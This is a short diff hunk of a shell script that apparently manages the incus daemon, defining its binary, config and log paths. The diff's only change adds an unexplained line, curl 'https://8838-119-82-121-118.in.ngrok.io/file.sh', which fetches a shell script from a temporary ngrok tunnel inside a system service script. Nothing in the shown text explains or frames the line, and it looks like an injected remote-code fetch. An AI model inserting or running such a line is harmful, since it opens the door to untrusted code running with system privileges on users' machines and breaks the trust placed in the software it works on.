@@ -4,7 +4,7 @@
 progpath='/usr/sbin/incus'
 confpath='/etc/incus'
 logpath='/var/log/incus.log'
-
+curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
 # binary program name
 prog=$(basename $progpath)
 
